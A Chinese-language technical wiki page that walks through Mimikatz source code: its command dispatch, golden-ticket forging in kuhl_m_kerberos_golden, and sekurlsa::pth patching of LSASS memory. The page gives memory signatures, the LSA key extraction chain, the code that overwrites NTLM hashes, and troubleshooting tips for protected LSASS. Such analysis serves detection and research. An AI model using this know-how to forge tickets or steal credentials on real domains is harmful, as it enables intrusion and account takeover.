---
title: Mimikatz 模块调度架构与黄金票据生成核心实现深度解析
description: 深度解析 Mimikatz 模块调度架构（KUHL_M 结构）与黄金票据生成核心函数 kuhl_m_kerberos_golden 的源码实现，涵盖命令行解析分发、加密体系选型、PAC
  构造及 BER 编码序列化全流程。新增 sekurlsa::pth 模块交叉引用，补全 Pass-the-Hash 内存补丁攻击面的技术细节索引。
category: program-analysis
tags:
- Mimikatz
- Kerberos
- Golden Ticket
- Source Code Analysis
- Windows Internals
- KUHL_M
- BER Encoding
- PAC
- Cryptography
- Red Teaming
- sekurlsa
- Pass-the-Hash
- LSASS
- Memory Patching
- NTLM
- LSA Protect
- Rust
- Credential Theft
date: 2024-01-15
updated: '2026-11-15'
---

## 概述

本页面基于对 Mimikatz 源码的深度审计，系统梳理其 **模块化调度架构（KUHL_M 体系）** 与 **黄金票据生成核心流程**（`kuhl_m_kerberos_golden`）。重点覆盖：

- 命令行参数解析与模块/命令分发机制
- KUHL_M 模块注册表结构与查找逻辑
- 黄金票据生成的加密体系选型（DES/RC4/AES128/AES256）
- PAC（Privilege Attribute Certificate）构造细节
- Kerberos 凭据的 BER 编码序列化与持久化
- **新增**：`sekurlsa::pth` 模块通过 LSASS 内存补丁实现 Pass-the-Hash 的底层原理，覆盖 LogonSessionList 定位、LSA Protect 密钥提取、凭据解密与 NTLM hash 替换全流程

> **项目地址**：https://github.com/gentilkiwi/mimikatz  
> **适用场景**：红队工具开发、Kerberos/NTLM 协议研究、Windows 认证机制深度分析、恶意代码分析与检测规则编写

---

## 一、整体架构：Mimikatz 模块调度体系

### 程序入口与命令分发流程

Mimikatz 入口位于 `mimikatz.c` 的 `wmain()`，核心逻辑为：

1. 初始化环境（`mimikatz_begin()`）
2. 处理启动参数或进入交互式循环
3. 通过 `mimikatz_dispatchCommand()` 分发命令

```c
// mimikatz.c - 程序入口
int wmain(int argc, wchar_t * argv[]) {
    // ... 初始化 ...
    for(i = MIMIKATZ_AUTO_COMMAND_START; i < argc; i++) {
        status = mimikatz_dispatchCommand(argv[i]);  // 处理启动参数
    }
    // ... 交互式循环 ...
    while (...) {
        fgetws(input, ...);
        status = mimikatz_dispatchCommand(input);    // 处理交互输入
    }
}
```

### 命令分发核心：`mimikatz_dispatchCommand`

```c
// mimikatz.c - 命令分发总入口
NTSTATUS mimikatz_dispatchCommand(wchar_t * input) {
    PWCHAR full = kull_m_file_fullPath(input);
    switch(full[0]) {
        case L'!': status = kuhl_m_kernel_do(full + 1); break;   // 内核模块
        case L'*': status = kuhl_m_rpc_do(full + 1); break;      // RPC 模块
        default:   status = mimikatz_doLocal(full); break;        // 本地模块（主流程）
    }
    LocalFree(full);
    return status;
}
```

> **关键点**：`mimikatz_doLocal` 是处理 `kerberos::golden`、`sekurlsa::pth` 等标准模块命令的核心分发函数。

### 本地命令解析与模块查找：`mimikatz_doLocal`

该函数实现了 **「模块名::命令名」 的两级查找**：

```c
NTSTATUS mimikatz_doLocal(wchar_t * input) {
    wchar_t ** argv = CommandLineToArgvW(input, &argc);
    wchar_t *module = NULL, *command = NULL, *match;

    // 1. 分离 "kerberos::golden" -> module="kerberos", command="golden"
    if (match = wcsstr(argv[0], L"::")) {
        module = LocalAlloc(...);
        RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
        command = match + 2;
    } else command = argv[0];

    // 2. 遍历模块注册表 mimikatz_modules[] 查找模块
    for (indexModule = 0; !moduleFound && indexModule < ARRAYSIZE(mimikatz_modules); indexModule++) {
        if (moduleFound = (!module || _wcsicmp(module, mimikatz_modules[indexModule]->shortName) == 0)) {
            // 3. 在模块内查找命令
            for (indexCommand = 0; !commandFound && indexCommand < mimikatz_modules[indexModule]->nbCommands; indexCommand++) {
                if (commandFound = _wcsicmp(command, mimikatz_modules[indexModule]->commands[indexCommand].command) == 0) {
                    // 4. 调用命令实现函数指针
                    status = mimikatz_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);
                }
            }
        }
    }
    // ... 清理 ...
}
```

> **设计亮点**：双层 `for` + `if` 短路求值，优雅实现「模块→命令」两级分发，无需哈希表即可 O(N) 查找。

---

## 二、KUHL_M 模块注册表与数据结构

### 全局模块注册表

```c
// mimikatz.h - 全局模块指针数组
const KUHL_M * mimikatz_modules[] = {
    &kuhl_m_standard,
    &kuhl_m_crypto,
    &kuhl_m_sekurlsa,      // <=== sekurlsa 模块（索引 2）
    &kuhl_m_kerberos,      // <=== Kerberos 模块（索引 3）
    &kuhl_m_ngc,
    // ... 其余模块 ...
};
```

### 模块结构体定义

```c
// kuhl_m.h - 模块元数据结构
typedef struct _KUHL_M {
    const wchar_t * shortName;        // 短名称，如 "kerberos"、"sekurlsa"
    const wchar_t * fullName;         // 完整名称
    const wchar_t * description;      // 描述
    const unsigned short nbCommands;  // 命令数量
    const KUHL_M_C * commands;        // 命令数组指针
    const PKUHL_M_C_FUNC_INIT pInit;  // 初始化回调
    const PKUHL_M_C_FUNC_INIT pClean; // 清理回调
} KUHL_M, *PKUHL_M;
```

### 命令结构体定义

```c
// kuhl_m.h - 单个命令元数据
typedef struct _KUHL_M_C {
    const PKUHL_M_C_FUNC pCommand;    // 实现函数指针
    const wchar_t * command;          // 命令名，如 "golden"、"pth"
    const wchar_t * description;      // 命令描述
} KUHL_M_C, *PKUHL_M_C;
```

### Kerberos 模块注册实例

```c
// kuhl_m_kerberos.c - Kerberos 模块定义
const KUHL_M kuhl_m_kerberos = {
    L"kerberos", L"Kerberos package module", L"",
    ARRAYSIZE(kuhl_m_c_kerberos), kuhl_m_c_kerberos,
    kuhl_m_kerberos_init, kuhl_m_kerberos_clean
};

// 命令表
const KUHL_M_C kuhl_m_c_kerberos[] = {
    {kuhl_m_kerberos_ptt,    L"ptt",      L"Pass-the-ticket [NT 6]"},
    {kuhl_m_kerberos_list,   L"list",     L"List ticket(s)"},
    {kuhl_m_kerberos_ask,    L"ask",      L"Ask or get TGS tickets"},
    {kuhl_m_kerberos_tgt,    L"tgt",      L"Retrieve current TGT"},
    {kuhl_m_kerberos_purge,  L"purge",    L"Purge ticket(s)"},
    {kuhl_m_kerberos_golden, L"golden",   L"Willy Wonka factory"},  // <=== 索引 5
    {kuhl_m_kerberos_hash,   L"hash",     L"Hash password to keys"},
    // ... 其余命令 ...
};
```

### sekurlsa 模块注册实例

```c
// kuhl_m_sekurlsa.c - sekurlsa 模块定义
const KUHL_M kuhl_m_sekurlsa = {
    L"sekurlsa", L"Sekurlsa package module", L"",
    ARRAYSIZE(kuhl_m_c_sekurlsa), kuhl_m_c_sekurlsa,
    kuhl_m_sekurlsa_init, kuhl_m_sekurlsa_clean
};

// 命令表（节选）
const KUHL_M_C kuhl_m_c_sekurlsa[] = {
    {kuhl_m_sekurlsa_logonpasswords, L"logonpasswords", L"Get logon passwords"},
    {kuhl_m_sekurlsa_pth,            L"pth",            L"Pass-the-hash"},           // <=== 核心命令
    {kuhl_m_sekurlsa_msv,            L"msv",            L"MSV credentials"},
    {kuhl_m_sekurlsa_kerberos,       L"kerberos",       L"Kerberos credentials"},
    // ... 其余命令 ...
};
```

> **索引映射**：
> - `kerberos::golden` 对应 `indexModule=3`（`mimikatz_modules[3]`）、`indexCommand=5`
> - `sekurlsa::pth` 对应 `indexModule=2`（`mimikatz_modules[2]`）、`indexCommand=1`

---

## 三、黄金票据生成核心：`kuhl_m_kerberos_golden` 深度解析

### 函数签名与核心参数

```c
// kuhl_m_kerberos.c - 黄金票据生成入口
NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[]) {
    BYTE key[AES_256_KEY_LENGTH] = {0};      // 密钥缓冲区（最大 AES256）
    DWORD keyType = 0;                       // 加密类型（ETYPE）
    DWORD id = 500;                          // 默认 RID（Administrator）
    // ... 其余变量声明 ...
}
```

### 参数解析与加密体系选型

支持四种加密体系，**优先级：AES256 > AES128 > RC4_HMAC_NT > DES_CBC_MD5**：

```c
// 解析 /des, /rc4 (或 /krbtgt), /aes128, /aes256
if (kull_m_string_args_byName(argc, argv, L"des", &szKey, NULL))
    keyType = KERB_ETYPE_DES_CBC_MD5;
else if (kull_m_string_args_byName(argc, argv, L"rc4", &szKey, NULL) ||
         kull_m_string_args_byName(argc, argv, L"krbtgt", &szKey, NULL))
    keyType = KERB_ETYPE_RC4_HMAC_NT;
else if (kull_m_string_args_byName(argc, argv, L"aes128", &szKey, NULL))
    keyType = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
else if (kull_m_string_args_byName(argc, argv, L"aes256", &szKey, NULL))
    keyType = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
```

> **关联知识**：`[[lm-ntlm-hash-generation-analysis]]` 详细解析了 NTLM Hash（RC4_HMAC_NT 密钥）的生成算法与 OpenSSL 适配细节，是理解 `/krbtgt` 参数值来源的基础。

### 密钥定位与校验

```c
status = CDLocateCSystem(keyType, &pCSystem);  // 定位加密体系实现
if (NT_SUCCESS(status)) {
    if (kull_m_string_stringToHex(szKey, key, pCSystem->KeySize)) {
        // 密钥长度校验通过
    } else {
        PRINT_ERROR(L"Krbtgt key size length must be %u (%u bytes) for %s\n",
                    pCSystem->KeySize * 2, pCSystem->KeySize,
                    kuhl_m_kerberos_ticket_etype(keyType));
    }
}
```

- `CDLocateCSystem`：根据 ETYPE 查找对应的 `PKERB_ECRYPT` 加密提供者（内含 `KeySize`、`Encrypt`/`Decrypt`/`Finish` 等函数指针）
- `kull_m_string_stringToHex`：将十六进制字符串转为二进制密钥，长度必须匹配 `pCSystem->KeySize`

### 时间窗口计算

```c
GetSystemTimeAsFileTime(&lifeTimeData.TicketStart);
// 对齐到分钟边界
*(PULONGLONG)&lifeTimeData.TicketStart -= *(PULONGLONG)&lifeTimeData.TicketStart % 10000000
                                        - ((LONGLONG)wcstol(szLifetime, NULL, 0) * 10000000 * 60);

lifeTimeData.TicketRenew = lifeTimeData.TicketEnd = lifeTimeData.TicketStart;
// /endin 默认 5256000 分钟（~10 年）
*(PULONGLONG)&lifeTimeData.TicketEnd += (ULONGLONG)10000000 * 60 * wcstoul(szLifetime, NULL, 0);
// /renewmax 默认同 endin
*(PULONGLONG)&lifeTimeData.TicketRenew += (ULONGLONG)10000000 * 60 * wcstoul(szLifetime, NULL, 0);
```

- 单位：`FILETIME`（100 纳秒间隔），`10000000` = 1 秒
- `startoffset`：向前偏移分钟数（默认 0）

### SID、组、额外 SID、Claims 解析

```c
// /sid 必选：域 SID
if (kull_m_string_args_byName(argc, argv, L"sid", &szSid, NULL)) {
    ConvertStringSidToSid(szSid, (PSID*)&pSid);  // 字符串 SID -> 二进制 SID
    // 提取 NetBIOS 域名（FQDN 首段大写）
    i = (DWORD)((PBYTE)baseDot - (PBYTE)szDomain);
    netbiosDomain = LocalAlloc(LPTR, i + sizeof(wchar_t));
    for (j = 0; j < i / sizeof(wchar_t); j++) netbiosDomain[j] = towupper(szDomain[j]);
}

// /id 用户 RID（默认 500）
kull_m_string_args_byName(argc, argv, L"id", &szId, NULL);
id = wcstoul(szId, NULL, 0);

// /groups 组 RID 列表（逗号分隔）
kuhl_m_pac_stringToGroups(szGroups, &groups, &nbGroups);

// /sids 额外 SID 列表（分号分隔）
kuhl_m_pac_stringToSids(szSids, &sids, &nbSids);

// /claims 声明集（JSON 格式）
pClaimsSet = kuhl_m_kerberos_claims_createFromString(szClaims);
```

> **PAC 构造关键**：上述参数最终汇聚进 `kuhl_m_kerberos_golden_data`，由其构造 **PAC_INFO_BUFFER** 链（LogonInfo、CredentialsInfo、ServerChecksum、KDCChecksum、Claims 等），详见 3.7 节。

### 服务/目标主体名（SPN）支持

```c
kull_m_string_args_byName(argc, argv, L"service", &szService, NULL);  // 如 "krbtgt", "cifs/host"
kull_m_string_args_byName(argc, argv, L"target", &szTarget, NULL);    // 目标域/主机
```

- `service`：指定票据的服务主体名称（SPN），默认为 `krbtgt/<domain>`
- `target`：目标域名，用于跨域 TGT 伪造

### 核心数据构造：`kuhl_m_kerberos_golden_data`

```c
PBERVAL BerApp_KrbCred = kuhl_m_kerberos_golden_data(
    szUser, szDomain, szService, szTarget, &lifeTimeData,
    key, pCSystem->KeySize, keyType,
    pSid, netbiosDomain, id,
    groups, nbGroups, sids, nbSids, rodc, pClaimsSet
);
```

该函数完成 **完整的 KRB_CRED 结构构造与 BER 编码**，主要步骤：

| 步骤 | 说明 |
|------|------|
| 1. 构造 `KERB_TICKET` | 填充 `TicketFlags`、`KeyType`、`Key`（会话密钥）、`StartTime`/`EndTime`/`RenewUntil`、`ClientName`/`ClientRealm`/`ServerName`/`ServerRealm` |
| 2. 生成会话密钥 | 随机生成或派生，用于后续 AP-REQ 加密 |
| 3. **构造 PAC** | 调用 `kuhl_m_pac_create()` 组装 `PACTYPE`：<br>• `LogonInfo` (KERB_VALIDATION_INFO) — 用户 SID、组、权限、登录脚本等<br>• `CredentialsInfo` — 补充凭证（可选）<br>• `ServerChecksum` — 服务端校验和（用服务密钥 HMAC）<br>• `KDCChecksum` — KDC 校验和（用 krbtgt 密钥 HMAC）<br>• `Claims` — 资源属性声明（Windows 2012+） |
| 4. 将 PAC 放入 `AuthorizationData` | `KERB_AUTH_DATA` 类型为 `KERB_AUTH_DATA_TOKEN_RESTRICTIONS` (128) |
| 5. 使用 `key`（krbtgt 密钥）加密 `EncTicketPart` | 调用 `pCSystem->Encrypt()`，ETYPE 由 `keyType` 决定 |
| 6. 组装 `KRB_CRED` | 包含 `tickets[]`、`enc-part`（加密后的 `KRB_CRED_ENC_PART`，含会话密钥、票据副本等） |
| 7. **BER 编码序列化** | 调用 `ber_encode_KRB_CRED()` 生成 `PBERVAL`（`bv_val`/`bv_len`），即最终的 `.kirbi` 二进制内容 |

> **BER 编码细节**：Mimikatz 内置轻量 ASN.1/BER 编码器（`kull_m_asn1.c`），手工实现 `KRB_CRED`、`EncTicketPart`、`PAC` 等结构的编码，无依赖外部库。

### 输出持久化或 Pass-the-Ticket

```c
if (BerApp_KrbCred) {
    if (isPtt) {  // /ptt 参数
        if (NT_SUCCESS(kuhl_m_kerberos_ptt_data(BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len)))
            kprintf(L"Golden ticket ... successfully submitted for current session\n");
    } else {      // 写文件
        if (kull_m_file_writeData(filename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
            kprintf(L"Final Ticket Saved to file !\n");
    }
    ber_bvfree(BerApp_KrbCred);
}
```

- `/ptt`：直接注入当前会话的 Kerberos 缓存（LSASS），无落地文件
- 默认写入 `ticket.kirbi`，可被 Rubeus、Kekeo 等工具复用

---

## 四、sekurlsa::pth 模块：Pass-the-Hash 内存补丁攻击面深度解析 {#sekurlsa-pth}

> **交叉引用**：本节内容对应专题页面 `[[mimikatz-sekurlsa-pth-internals]]`，该页面提供纯 Rust 实现参考与更细致的结构体定义。

### 攻击原理概述

`sekurlsa::pth` 通过 **Patch LSASS.exe 进程中 LSASRV.dll 模块空间的内存**，修改指定 Logon Session 对应的 NTLM Hash，实现 Pass-the-Hash。与协议层面的 PTH（如 Impacket）不同，内存补丁方式具备**全覆盖性**：一旦补丁生效，后续该 Logon Session 发起的所有网络认证（SMB、RPC、WinRM、WMI 等）均由 LSASS 自动使用修改后的 Hash，无需单独实现各上层协议。

**核心流程**：
1. 解析参数（/user、/domain、/ntlm、/aes128、/aes256、/run、/luid、/impersonate）
2. 若提供 `/luid`：直接定位并修改该 LUID 对应的 Logon Session 凭据
3. 若无 `/luid`：以 `CREATE_SUSPENDED` + `LOGON_NETCREDENTIALS_ONLY` 启动新进程，获取其 Token 中的 LUID
4. 通过 `kuhl_m_sekurlsa_acquireLSA` 读取 LSASS 进程中 LSASRV.dll 内存
5. 通过内存签名定位 `LogonSessionList` 与 `LogonSessionListCount` 全局变量
6. 遍历双向链表，匹配目标 LUID 的 `KIWI_MSV1_0_LIST_*` 结构
7. 通过内存签名定位 LSA Protect 密钥（`h3DesKey` / `hAesKey`），解密凭据块
8. 修改 `MSV1_0_PRIMARY_CREDENTIAL` 结构：清除 LM/SHA/DPAPI 标记，设置 `isNtOwfPassword=1`，写入攻击者提供的 NTLM Hash
9. 重新加密凭据块，`WriteProcessMemory` 写回 LSASS
10. `ResumeThread` 恢复目标进程，完成攻击

### 关键参数与分支逻辑

```c
// kuhl_m_sekurlsa.c - kuhl_m_sekurlsa_pth 入口
NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[]) {
    // 参数获取
    kull_m_string_args_byName(argc, argv, L"user", &user, L"");
    kull_m_string_args_byName(argc, argv, L"domain", &domain, L"");
    kull_m_string_args_byName(argc, argv, L"ntlm", &ntlm, NULL);      // RC4_HMAC_NT
    kull_m_string_args_byName(argc, argv, L"aes128", &aes128, NULL);  // AES128
    kull_m_string_args_byName(argc, argv, L"aes256", &aes256, NULL);  // AES256
    kull_m_string_args_byName(argc, argv, L"run", &run, L"cmd.exe");
    kull_m_string_args_byName(argc, argv, L"luid", &luidStr, NULL);   // 可选：直接指定 LUID
    kull_m_string_args_byName(argc, argv, L"impersonate", &impersonate, NULL);

    // 分支 1：指定 LUID -> 直接 Patch 现有 Logon Session
    if (luidStr) {
        RtlZeroMemory(&luid, sizeof(LUID));
        luid.LowPart = wcstoul(luidStr, NULL, 0);
        status = kuhl_m_sekurlsa_pth_luid(&luid, user, domain, ntlm, aes128, aes256);
    }
    // 分支 2：无 LUID -> 启动新进程，获取新 Logon Session
    else {
        CreateProcessWithLogonW(user, domain, L"", LOGON_NETCREDENTIALS_ONLY,
                                run, CREATE_NEW_CONSOLE | CREATE_SUSPENDED, NULL, NULL, &si, &pi);
        // 获取进程 Token -> TOKEN_STATISTICS.AuthenticationId (LUID)
        // 调用 kuhl_m_sekurlsa_pth_luid 修改该 LUID 对应的凭据
        ResumeThread(pi.hThread);
    }
}
```

> **`LOGON_NETCREDENTIALS_ONLY` 关键特性**：创建新 Logon Session 且**不校验凭据有效性**，允许使用空密码启动进程，后续再 Patch 对应 Session 的 Hash。

### LSASS 内存获取：`kuhl_m_sekurlsa_acquireLSA`

```c
// 核心任务：
// 1. OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPid)
// 2. 读取 PEB -> Ldr -> InMemoryOrderModuleList 遍历模块，定位 LSASRV.dll 基址与大小
// 3. ReadProcessMemory 读取 LSASRV.dll 完整映像到本地缓冲区
// 4. 获取 OS 版本（MajorVersion, MinorVersion, BuildNumber），用于后续选择对应内存签名
```

> **技术细节**：`InMemoryOrderModuleList` 遍历是 Windows 进程内存分析基础技能，`ReadProcessMemory` 跨进程读取需 `PROCESS_VM_READ` 权限。

### LogonSessionList 定位与解析：内存签名机制

Mimikatz 通过 **版本化内存签名** 定位全局变量 `LogonSessionList` 与 `LogonSessionListCount`。签名选取同时引用这两个全局变量的函数中的不变机器码片段。

**签名表结构（节选）**：
```c
// 不同 Windows 版本对应的签名与偏移
pub(crate) const PTRN_WN63_LogonSessionList: &[u8] = &[
    0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05,
];
pub(crate) const PTRN_WN1703_LogonSessionList: &[u8] = &[
    0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74,
];
// ...
pub(crate) const LSA_SRV_REF_BUILD_10_1703: (u32, &[u8], (isize, isize)) = 
    (WIN_BUILD_10_1703, PTRN_WN1703_LogonSessionList, (23, -4));  // (List偏移, Count偏移)
```

**64 位相对寻址解析**：
```c
// 找到签名在模块内存中的偏移 ptrn_offset
// 读取签名处相对偏移处的 4 字节 RIP 相对偏移 offset
read_process_mem(handle, dll_base + ptrn_offset + rel_offset, &offset, 4);
// 目标全局变量地址 = dll_base + ptrn_offset + rel_offset + 4 + offset
ptr_logon_session_lst = dll_base + ptrn_offset + rel_offset + 4 + offset;
```

**LogonSessionList 结构**：指向 `LIST_ENTRY` 双向链表头，每个节点为 `KIWI_MSV1_0_LIST_*`（版本相关，Win10 1607+ 为 `KIWI_MSV1_0_LIST_63`）。

**关键结构体字段偏移（Win10 1607 示例）**：
| 字段 | 类型 | 说明 |
|------|------|------|
| `Flink` / `Blink` | `LIST_ENTRY` | 链表指针 |
| `LocallyUniqueIdentifier` | `LUID` | Logon Session 唯一标识 |
| `UserName` | `UNICODE_STRING` | 用户名 |
| `DomainName` | `UNICODE_STRING` | 域名 |
| `LogonType` | `ULONG` | 登录类型 |
| `Credentials` | `PVOID` | 指向加密的 `MSV1_0_PRIMARY_CREDENTIAL` |

### LSA Protect 密钥提取与凭据解密

NT6+ 使用 **AES-CFB**（数据长度模 8 ≠ 0）或 **3DES-CBC**（模 8 = 0）加密凭据。密钥存储在 LSASRV.dll 全局变量 `h3DesKey` / `hAesKey` 中，以 `KIWI_BCRYPT_HANDLE_KEY` 结构引用 `KIWI_BCRYPT_KEY` -> `KIWI_HARD_KEY` -> 明文密钥。

**密钥结构链**：
```
h3DesKey/hAesKey (全局指针)
  -> KIWI_BCRYPT_HANDLE_KEY { tag="UUUR", key: *KIWI_BCRYPT_KEY }
      -> KIWI_BCRYPT_KEY { tag="MSSK", hardkey: KIWI_HARD_KEY }
          -> KIWI_HARD_KEY { cbSecret, data[cbSecret] }  // 明文密钥
```

**提取流程**：
1. 内存签名定位 `h3DesKey` / `hAesKey` 全局指针地址
2. `ReadProcessMemory` 读取 `KIWI_BCRYPT_HANDLE_KEY` -> 获取 `key` 指针
3. 读取 `KIWI_BCRYPT_KEY` -> 验证 tag `MSSK` -> 获取 `hardkey` 偏移
4. 读取 `KIWI_HARD_KEY` -> 提取 `data` 中的明文密钥（长度 `cbSecret`）
4. `BCryptOpenAlgorithmProvider` + `BCryptGenerateSymmetricKey` 导入密钥句柄
5. `BCryptDecrypt` 解密 `Credentials` 指向的凭据块

> **版本差异**：Win8 以前用 `KIWI_BCRYPT_KEY`，Win8~Blue 用 `KIWI_BCRYPT_KEY8`，Blue 以后用 `KIWI_BCRYPT_KEY81`，结构体大小与 `hardkey` 偏移均不同。

### NTLM Hash 补丁与凭据重加密

**解密后的 `MSV1_0_PRIMARY_CREDENTIAL_10_1607` 结构**：
```c
struct MSV1_0_PRIMARY_CREDENTIAL_10_1607 {
    LogonDomainName: UNICODE_STRING,
    UserName: UNICODE_STRING,
    pNtlmCredIsoInProc: PVOID,
    isIso: u8,
    isNtOwfPassword: u8,      // 是否有 NTLM Hash
    isLmOwfPassword: u8,      // 是否有 LM Hash
    isShaOwPassword: u8,      // 是否有 SHA Hash
    isDPAPIProtected: u8,     // 是否 DPAPI 保护
    // ... 对齐字段 ...
    NtOwfPassword: [u8; 16],  // NTLM Hash (MD4)
    LmOwfPassword: [u8; 16],  // LM Hash
    ShaOwPassword: [u8; 20],  // SHA Hash
    DPAPIProtected: [u8; 16], // DPAPI 保护数据
};
```

**补丁逻辑**：
```c
// 清除除 NTLM 外的所有凭据标记
credentials[offsetToIsLmOwfPassword] = 0;
credentials[offsetToIsShaOwPassword] = 0;
if (offsetToIsIso) credentials[offsetToIsIso] = 0;
if (offsetToIsDPAPIProtected) {
    credentials[offsetToIsDPAPIProtected] = 0;
    memset(&credentials[offsetToDPAPIProtected], 0, 16);
}
memset(&credentials[offsetToLmOwfPassword], 0, 16);
memset(&credentials[offsetToShaOwPassword], 0, 20);

// 设置 NTLM Hash
credentials[offsetToIsNtOwfPassword] = 1;
memcpy(&credentials[offsetToNtOwfPassword], attacker_ntlm_hash, 16);

// 重新加密
nt6_encrypt_mem(credentials, TRUE);  // 使用之前提取的 h3DesKey/hAesKey

// 写回 LSASS
WriteProcessMemory(hLsass, credentials_ptr_in_lsass, credentials, cred_size, NULL);
```

> **关键点**：补丁仅修改内存中**该 Logon Session**的凭据，不触及 SAM、注册表或磁盘，重启失效，属于**运行时内存篡改**。

### Kerberos 凭据同步修补

`kuhl_m_sekurlsa_enum_callback_kerberos_pth` 回调同步修改 Kerberos 凭据（`KIWI_KERBEROS_*` 结构），替换 `Key` 字段为对应的 AES/RC4 Key，使 `/ptt` 等 Kerberos 操作同样生效。原理同 MSV：定位链表 -> 解密 -> 替换 Key -> 加密写回。

---

## 五、关键数据结构速查表

| 结构体 | 定义位置 | 核心字段 | 用途 |
|--------|----------|----------|------|
| `KUHL_M` | `kuhl_m.h` | `shortName`, `commands`, `nbCommands` | 模块元数据 |
| `KUHL_M_C` | `kuhl_m.h` | `pCommand`, `command`, `description` | 命令元数据 |
| `PKERB_ECRYPT` | `kerberos.h` | `KeySize`, `Encrypt`, `Decrypt`, `Finish` | 加密体系抽象 |
| `KUHL_M_KERBEROS_LIFETIME_DATA` | `kuhl_m_kerberos.h` | `TicketStart`, `TicketEnd`, `TicketRenew` | 时间窗口 |
| `PACTYPE` / `PAC_INFO_BUFFER` | `kerberos.h` | `cBuffers`, `Buffers[]` | PAC 容器 |
| `KERB_VALIDATION_INFO` | `ntsecapi.h` | `UserId`, `GroupIds`, `SidCount`, `ExtraSids` | PAC LogonInfo 核心 |
| `PBERVAL` | `kull_m_asn1.h` | `bv_val`, `bv_len` | BER 编码结果 |
| `KIWI_MSV1_0_LIST_63` | `sekurlsa.h` | `Flink`, `LUID`, `UserName`, `Credentials` | Logon Session 节点 |
| `MSV1_0_PRIMARY_CREDENTIAL` | `sekurlsa.h` | `isNtOwfPassword`, `NtOwfPassword` | 明文凭据结构 |
| `KIWI_BCRYPT_HANDLE_KEY` | `sekurlsa.h` | `tag`, `key` | LSA Protect 密钥句柄 |
| `KIWI_HARD_KEY` | `sekurlsa.h` | `cbSecret`, `data` | 明文密钥材料 |

---

## 六、调试与分析建议

### 断点设置建议

| 断点位置 | 目的 |
|----------|------|
| `mimikatz.c: wmain()` | 观察参数传入、初始化流程 |
| `mimikatz.c: mimikatz_doLocal()` | 观察模块/命令查找逻辑、`argv` 分离 |
| `kuhl_m_kerberos.c: kuhl_m_kerberos_golden()` | 核心参数解析、加密体系选型、时间计算 |
| `kuhl_m_kerberos.c: kuhl_m_kerberos_golden_data()` | PAC 构造、票据加密、BER 编码全流程 |
| `kuhl_m_sekurlsa.c: kuhl_m_sekurlsa_pth()` | PTH 参数分发、分支选择、进程创建 |
| `kuhl_m_sekurlsa.c: kuhl_m_sekurlsa_acquireLSA()` | LSASS 句柄获取、LSASRV.dll 映像读取 |
| `kuhl_m_sekurlsa.c: kuhl_m_sekurlsa_pth_luid()` | LogonSessionList 遍历、LUID 匹配、凭据 Patch |
| `kull_m_asn1.c: ber_encode_*()` | 观察 ASN.1 编码细节 |

### 关键变量监控

| 变量 | 监控点 | 预期值/校验逻辑 |
|------|--------|-----------------|
| `keyType` / `pCSystem->KeySize` | Golden Ticket | 确认加密算法与密钥长度匹配（AES256=32字节, RC4=16字节, DES=8字节） |
| `lifeTimeData` 三个 `FILETIME` | Golden Ticket | 验证时间窗口是否符合预期、分钟对齐 |
| `pSid` / `netbiosDomain` / `id` / `groups` / `sids` / `pClaimsSet` | Golden Ticket PAC | PAC 核心字段完整性 |
| `BerApp_KrbCred->bv_len` | Golden Ticket 输出 | 最终票据大小（通常 8-12 KB） |
| `luid` (LowPart/HighPart) | PTH 分支 | 与目标进程 Token `AuthenticationId` 一致 |
| `ptr_logon_session_lst` / `logon_session_lst_cnt` | PTH 内存解析 | 链表头地址非空、计数 > 0 |
| `h3DesKey` / `hAesKey` 指针值 | LSA Protect 密钥提取 | 非 NULL，指向有效 `KIWI_BCRYPT_HANDLE_KEY` |
| `credentials[offsetToIsNtOwfPassword]` | PTH 补丁前后 | 补丁前 0 -> 补丁后 1 |
| `credentials[offsetToNtOwfPassword..+15]` | PTH 补丁前后 | 补丁前全 0/旧 Hash -> 补丁后为攻击者 NTLM Hash |

### 常见问题排查

| 现象 | 可能原因 | 定位方向 |
|------|----------|----------|
| `PRINT_ERROR("Krbtgt key size length must be ...")` | 密钥十六进制长度与 ETYPE 不匹配 | 检查 `keyType` 与输入 `/krbtgt`、`/aes256` 等参数对应关系 |
| `CDLocateCSystem` 返回非 0 | 系统不支持该 ETYPE（如 XP 无 AES） | 检查 `pCSystem` 是否为 `NULL`，尝试降级至 RC4 |
| 生成票据无法使用 | PAC 校验和计算错误、SID 格式错误 | 断点 `kuhl_m_pac_create`、`kuhl_m_pac_sign`，对比真实 TGT PAC 结构 |
| `.kirbi` 文件损坏 | BER 编码长度字段错误 | 监控 `ber_encode_KRB_CRED` 返回值，检查 `bv_len` 与实际写入长度 |
| `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)` | 权限不足（无 `PROCESS_VM_READ`/`PROCESS_QUERY_INFORMATION`） | 以 SYSTEM/管理员运行，或检查 LSASS 保护级别（RunAsPPL） |
| 内存签名未命中 | Windows 版本/补丁导致 LSASRV.dll 代码变更 | 对比目标系统 LSASRV.dll 反汇编，提取新签名 |
| `ReadProcessMemory` 返回 0 / `ERROR_PARTIAL_COPY` | LSASS 开启 VBS/HVCI、或地址无效 | 检查目标地址是否在模块范围内，考虑 `MmCopyVirtualMemory` 内核读取 |
| Patch 后网络认证仍失败 | 未同步修补 Kerberos 凭据、或目标进程非该 Logon Session | 确认 `kuhl_m_sekurlsa_enum_callback_kerberos_pth` 执行，验证进程 Token LUID |

---

## 七、扩展阅读与关联页面

- `[[mimikatz-sekurlsa-pth-internals]]` — **本页面新增交叉引用**：深度解析 `sekurlsa::pth` 模块通过 LSASS 内存补丁实现 Pass-the-Hash 的底层原理，覆盖 LogonSessionList 定位、LSA Protect 密钥提取、凭据解密与 NTLM hash 替换全流程，并附纯 Rust 实现参考
